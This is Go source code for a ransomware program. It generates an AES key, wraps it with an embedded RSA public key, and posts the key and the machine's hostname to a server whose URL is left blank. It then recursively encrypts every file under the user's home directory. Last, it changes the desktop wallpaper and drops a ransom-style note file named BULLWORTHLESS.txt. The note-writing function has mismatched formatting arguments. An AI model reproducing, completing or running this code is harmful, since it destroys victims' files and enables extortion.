package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/sha256"
	"encoding/pem"
	"encoding/hex"
	"net/url"
	"fmt"
	"github.com/reujab/wallpaper"
	"net/http"
	"runtime"
	"io"
	"os"
)

var key []byte
var fileSep string
var serverPub = []byte(`
-----BEGIN PUBLIC KEY-----
MIIBCgKCAQEAxPurUv662UU6qWZokwN/Obn4Pv7FOhrqxgdNEbCHGfItxt3xkYgT
uDtPMukMZteli2SxkboA2MpepNlNJ3sSRdK830je/W2KtKWwr3woT6Xe32jXztDI
1Q6jtOvXO0xW0liEUWLvQCLQrflLPhNwvv1fDM2JEcrXWSaPoS9EhAiEtPUtR8xx
BAR8+kXs4dNalybDz893unEI/YmnNS2WXwDnj14u9IRLD0XtbuP/aR8sFxzLTQdG
g0CFP4RcdYzvo/VA65HFQRzsP8E5bmv5khFm8COl6zkzgxZC4ZR7kB5DHHCs1eaa
XJLa5mSakYA2CcoILzZAoFC0V4tD15KP8QIDAQAB
-----END PUBLIC KEY-----`)

func main() {

	home, _ := os.UserHomeDir()

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}

	err := genKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	hexKey, err := encryptKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	shaSum, err := sendKey(hexKey)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	traverseFiles(home)
	writeNote(shaSum, hexKey)
}

func genKey() error {
	key = make([]byte, 32)
	_, err := rand.Read(key)
	return err
}

func encryptKey() (string, error) {
	block, _ := pem.Decode(serverPub)
	if block == nil || block.Type != "PUBLIC KEY" {
		fmt.Println("invalid pub key")
		os.Exit(1)
	}
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		fmt.Println(err)
		return "", err
	}

	encKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		pub,
		key,
		nil)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	encHex := hex.EncodeToString(encKey)
	return encHex, nil
}


func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
	}

	for _, file := range files {
		if file.IsDir() {
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
			fmt.Println("dir path: ", base)
		} else {
			base := path + fileSep + file.Name()

			fmt.Println("file to enc: ", base)
			encryptFile(base)
		}
	}
	for _, dir := range dirs {
		traverseFiles(dir)
	}
}

func encryptFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err)
	}

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	enc := gcm.Seal(nil, nonce, data, nil)
	d := append(nonce, enc...)
	err = os.WriteFile(path, d, 0777)
	if err != nil {
		fmt.Println(err)
	}
}

func sendKey(hexKey string) (string, error) {
	hostname, _ := os.Hostname()
	sum := sha256.Sum256([]byte(hexKey))
	shaSum := fmt.Sprintf("%x", sum)
	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}, "sha256sum": {shaSum}})
	if err != nil || resp.StatusCode != 200 {
		fmt.Println(err)
		fmt.Println("HTTP Response: ", resp.StatusCode)
		return "", err
	}
	return shaSum, nil
}

func writeNote(shaSum string, hexKey string) {
	err := wallpaper.SetFromURL("https://www.gaminginstincts.com/wp-content/uploads/2019/08/Bully_2_Screenshot_Leaked_Gaming_Instincts_TV_Article_Website_Youtube_Thumbnail.jpg")
	if err != nil {
		fmt.Println(err)
	}
	n, err := os.Create("BULLWORTHLESS.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer n.Close()
	home, _ := os.UserHomeDir()
	s := fmt.Sprintf("\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
	_, err = n.WriteString(s)
	if err != nil {
		fmt.Println("Error writing file: ", err)
	}
}

